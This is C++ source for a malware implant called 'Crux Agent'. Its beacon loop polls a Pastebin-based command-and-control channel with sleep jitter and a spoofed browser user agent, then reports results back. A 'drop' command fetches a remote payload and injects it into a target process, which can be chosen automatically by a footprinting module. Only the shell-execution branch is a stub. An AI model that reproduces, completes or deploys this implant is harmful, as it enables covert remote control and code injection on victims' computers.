#ifndef UNICODE
#define UNICODE
#endif 



/*
Example how to use below:
-----------------------------
#ifdef DEBUG
	std::cout << "Debugging information: Program is running smoothly." << std::endl;
	#endif
-----------------------------
*/

#include "awaiting_thread.cc"
#include "shcode.h"
#include "c2/pastebin.h"
#include "footprinting/footprinting.h"
#include <random>
#include <thread>
#include <chrono>

int validate_components();

// Configurable C2 URL
#ifdef DEBUG
    const std::wstring C2_URL = L"192.168.0.204"; // REPLACE WITH YOUR LINUX VM IP
#else
    const std::wstring C2_URL = L"pastebin.com";
#endif

#include "dropper/dropper.cc"

// Beacon Loop Implementation
void BeaconLoop() {
    Comm comm(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
    if (!comm.Initialize()) {
#ifdef DEBUG
        std::cerr << "[Beacon] Failed to initialize Comm module." << std::endl;
#endif
        return;
    }

    // Use a fixed key for prototype, or derive from environment
    time_based_encoder encoder("secret_key_123", 30); 
    pastebin_c2 c2(&comm, &encoder, C2_URL);
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> jitter_dist(-5, 5); // +/- 5 seconds jitter
    int base_sleep = 10; // 10 seconds base sleep

    std::string agent_id = "agent_" + std::to_string(std::time(nullptr)); // Simple ID
    
    // Initialize Dropper
#ifdef DEBUG
    bool debug_mode = true;
#else
    bool debug_mode = false;
#endif
    Dropper dropper(&comm, debug_mode);

    while (true) {
        // 2. Sleep with Jitter
        int sleep_time = base_sleep + jitter_dist(gen);
        if (sleep_time < 1) sleep_time = 1;
        
#ifdef DEBUG
        std::cout << "[Beacon] Sleeping for " << sleep_time << " seconds..." << std::endl;
#endif
        std::this_thread::sleep_for(std::chrono::seconds(sleep_time));

        // 3. Poll for Commands
#ifdef DEBUG
        std::cout << "[Beacon] Polling for commands..." << std::endl;
#endif
        // In real scenario, URL would be dynamic or rotated
        CommandBatch batch = c2.fetch_commands(L"/raw/dummy_cmds");

        if (!batch.commands.empty()) {
#ifdef DEBUG
            std::cout << "[Beacon] Received " << batch.commands.size() << " commands." << std::endl;
#endif
            LogBatch logs;
            logs.agent_id = agent_id;
            logs.timestamp = std::time(nullptr);

            // 4. Execute Commands
            for (const auto& cmd : batch.commands) {
                CommandResult result;
                result.task_id = cmd.id;
                
                // Placeholder Execution Logic
                if (cmd.type == "exec") {
                    // Execute shell command (TODO: Implement actual execution)
                    result.status = "success";
                    result.output = "Executed: " + cmd.args[0]; 
                } else if (cmd.type == "info") {
                    result.status = "success";
                    result.output = "Agent ID: " + agent_id;
                } else if (cmd.type == "drop") {
                    // Dropper Logic
                    if (cmd.args.empty()) {
                        result.status = "error";
                        result.error = "Missing PID argument for drop command";
                    } else {
                        try {
                            DWORD pid = 0;
                            if (cmd.args[0] == "auto") {
                                // Auto-select PID using Footprinting module
                                Footprinting footprint;
                                pid = footprint.FindInjectionTarget();
                                
                                if (pid == 0) {
                                    result.status = "error";
                                    result.error = "Auto-selection failed: No suitable target found";
                                    dropper.ReportStatus(cmd.id, false, "Auto-selection failed");
                                    logs.results.push_back(result);
                                    continue;
                                }
                                #ifdef DEBUG
                                std::cout << "[Beacon] Auto-selected PID: " << pid << std::endl;
                                #endif
                            } else {
                                pid = std::stoul(cmd.args[0]);
                            }

                            std::vector<unsigned char> payload;
                            
                            // 1. Fetch Payload
                            if (dropper.FetchPayload(payload)) {
                                // 2. Inject
                                if (dropper.Inject(pid, payload)) {
                                    result.status = "success";
                                    result.output = "Payload injected into PID " + std::to_string(pid);
                                    dropper.ReportStatus(cmd.id, true, "Injection successful");
                                } else {
                                    result.status = "error";
                                    result.error = "Injection failed";
                                    dropper.ReportStatus(cmd.id, false, "Injection failed");
                                }
                            } else {
                                result.status = "error";
                                result.error = "Failed to fetch payload";
                                dropper.ReportStatus(cmd.id, false, "Payload fetch failed");
                            }
                        } catch (...) {
                            result.status = "error";
                            result.error = "Invalid PID format";
                        }
                    }
                } else {
                    result.status = "error";
                    result.error = "Unknown command type";
                }
                logs.results.push_back(result);
            }

            // 5. Post Logs
#ifdef DEBUG
            std::cout << "[Beacon] Posting logs..." << std::endl;
#endif
            c2.post_logs(logs);
        }
    }
}

int main(int argc, char* argv[]) {
#ifdef DEBUG
    std::cout << "[Main] Starting Crux Agent..." << std::endl;
#endif

    // Start the Beacon Loop
    BeaconLoop();

    return 0;
}
